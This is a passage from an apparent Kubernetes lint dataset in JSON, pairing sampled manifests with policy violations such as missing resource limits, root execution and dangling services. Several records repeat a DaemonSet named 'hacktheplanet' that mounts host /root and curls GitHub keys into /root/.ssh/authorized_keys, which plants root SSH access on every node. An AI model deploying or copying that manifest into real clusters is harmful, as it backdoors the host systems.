/opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"linkis-resourcemanager\" does not have a read-only root file system"
  },
  {
    "id": "1878",
    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"linkis-resourcemanager\" is not set to runAsNonRoot"
  },
  {
    "id": "1879",
    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"linkis-resourcemanager\" has cpu request 0"
  },
  {
    "id": "1880",
    "manifest_path": "data/manifests/the_stack_sample/sample_0425.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-resourcemanager-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-resourcemanager\n  template:\n    metadata:\n      labels:\n        app: linkis-resourcemanager\n        release: dev\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-resourcemanager\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-resourcemanager\n        image: wedatasphere/linkis:linkis-resourcemanager-0.11.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 14004\n        livenessProbe:\n          tcpSocket:\n            port: 14004\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '14004'\n        volumeMounts:\n        - name: linkis-resourcemanager-config\n          mountPath: /opt/linkis/conf\n        - name: varlog\n          mountPath: /opt/linkis/linkis-resourcemanager/logs\n        - name: hadoop-config\n          mountPath: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n        - name: hive-config\n          mountPath: /opt/hive/apache-hive-2.3.6-bin/conf\n        - name: spark-config\n          mountPath: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n      volumes:\n      - name: linkis-resourcemanager-config\n        configMap:\n          name: linkis-resourcemanager-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n      - name: hadoop-config\n        hostPath:\n          path: /opt/hadoop/hadoop-2.7.7/etc/hadoop\n      - name: hive-config\n        hostPath:\n          path: /opt/hive/apache-hive-2.3.6-bin/conf\n      - name: spark-config\n        hostPath:\n          path: /opt/spark/spark-2.4.4-bin-hadoop2.7/conf\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"linkis-resourcemanager\" has memory limit 0"
  },
  {
    "id": "1881",
    "manifest_path": "data/manifests/the_stack_sample/sample_0426.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: payment\n  labels:\n    name: payment\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n  selector:\n    name: payment\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:payment])"
  },
  {
    "id": "1882",
    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mainnet-dump-staking-ledger-container\" does not have a read-only root file system"
  },
  {
    "id": "1883",
    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mainnet-dump-staking-ledger-container\" is not set to runAsNonRoot"
  },
  {
    "id": "1884",
    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mainnet-dump-staking-ledger-container\" has cpu request 0"
  },
  {
    "id": "1885",
    "manifest_path": "data/manifests/the_stack_sample/sample_0427.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: mainnet-dump-staking-ledger-cronjob\nspec:\n  jobTemplate:\n    template:\n      spec:\n        volumes:\n        - name: gcloud-keyfile\n          secret:\n            secretName: gcloud-keyfile\n            defaultMode: 256\n            items:\n            - key: keyfile\n              path: keyfile.json\n        containers:\n        - name: mainnet-dump-staking-ledger-container\n          image: minaprotocol/mina-daemon-baked:1.1.5-a42bdee\n          env:\n          - name: GCLOUD_KEYFILE\n            value: /gcloud/keyfile.json\n          volumeMounts:\n          - name: gcloud-keyfile\n            mountPath: /gcloud/\n          command:\n          - /bin/bash\n          - -c\n          - 'mina daemon --generate-genesis-proof true --peer-list-url https://storage.googleapis.com/mina-seed-lists/mainnet_seeds.txt\n            --background;sleep 480;echo \"done sleeping\";while true;do mina ledger\n            export staking-epoch-ledger>staking_epoch_ledger.txt;if [ \"$?\" -eq 0 ]&&[\n            \"$(cat staking_epoch_ledger.txt)\" != \"Ledger not found: current staking\n            ledger not available\" ];then echo \"staking epoch ledger dumped!\";break;else\n            echo \"waiting for staking ledger to become available, sleeping for 30s\";sleep\n            30;fi;done;DATE=\"$(date +%F_%H%M)\";STAKING_LEDGER_HASH=\"$(mina ledger\n            hash --ledger-file staking_epoch_ledger.txt)\";LEDGER_FILENAME=\"$DATE\"_staking_epoch_ledger_\"$STAKING_LEDGER_HASH\".txt;mv\n            ./staking_epoch_ledger.txt ./$LEDGER_FILENAME;mina ledger export next-epoch-ledger>next_epoch_ledger.txt;echo\n            \"next epoch ledger dumped!\";NEXT_LEDGER_HASH=\"$(mina ledger hash --ledger-file\n            next_epoch_ledger.txt)\";NEXT_LEDGER_FILENAME=\"$DATE\"_next_epoch_ledger_\"$NEXT_LEDGER_HASH\".txt;mv\n            ./next_epoch_ledger.txt ./$NEXT_LEDGER_FILENAME;echo \"upload to a GCP\n            cloud storage bucket\";gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $LEDGER_FILENAME gs://mina-staking-ledgers;gsutil -o Credentials:gs_service_key_file=/gcloud/keyfile.json\n            cp $NEXT_LEDGER_FILENAME gs://mina-staking-ledgers'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mainnet-dump-staking-ledger-container\" has memory limit 0"
  },
  {
    "id": "1886",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"hacktheplanet\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1887",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"web\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1888",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hacktheplanet\" does not have a read-only root file system"
  },
  {
    "id": "1889",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "1890",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hacktheplanet\" is not set to runAsNonRoot"
  },
  {
    "id": "1891",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "1892",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hacktheplanet\" has cpu request 0"
  },
  {
    "id": "1893",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "1894",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hacktheplanet\" has memory limit 0"
  },
  {
    "id": "1895",
    "manifest_path": "data/manifests/the_stack_sample/sample_0430.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: hacktheplanet\nspec:\n  selector:\n    matchLabels:\n      app: hacktheplanet\n  template:\n    metadata:\n      labels:\n        app: hacktheplanet\n    spec:\n      volumes:\n      - name: root\n        hostPath:\n          path: /root\n      initContainers:\n      - name: hacktheplanet\n        image: alpine\n        volumeMounts:\n        - name: root\n          mountPath: /root\n        command:\n        - sh\n        - -c\n        - mkdir -p /root/.ssh && apk update && apk add curl && curl https://github.com/jpetazzo.keys\n          > /root/.ssh/authorized_keys\n      containers:\n      - name: web\n        image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "1896",
    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"order-service\" does not have a read-only root file system"
  },
  {
    "id": "1897",
    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"order-service\" is not set to runAsNonRoot"
  },
  {
    "id": "1898",
    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"order-service\" has cpu request 0"
  },
  {
    "id": "1899",
    "manifest_path": "data/manifests/the_stack_sample/sample_0433.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: order-deployment\n  labels:\n    app: order-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: order-service\n  template:\n    metadata:\n      labels:\n        app: order-service\n    spec:\n      containers:\n      - name: order-service\n        image: thomasvitale/order-service:0.0.1-SNAPSHOT\n        ports:\n        - containerPort: 9002\n        env:\n        - name: SPRING_DATASOURCE_URL\n          value: jdbc:postgresql://polardb-order-service:5432/polardb_order\n        - name: POLAR_CATALOG_SERVICE_URL\n          value: http://catalog-service\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"order-service\" has memory limit 0"
  },
  {
    "id": "1900",
    "manifest_path": "data/manifests/the_stack_sample/sample_0436.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: fedmsg-relay\n  labels:\n    app: fedmsg-relay\n    service: fedmsg-relay\nspec:\n  ports:\n  - name: inbound\n    port: 3999\n    targetPort: 3999\n  - name: outbound\n    port: 9941\n    targetPort: 9941\n  selector:\n    deploymentconfig: fedmsg-relay\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[deploymentconfig:fedmsg-relay])"
  },
  {
    "id": "1901",
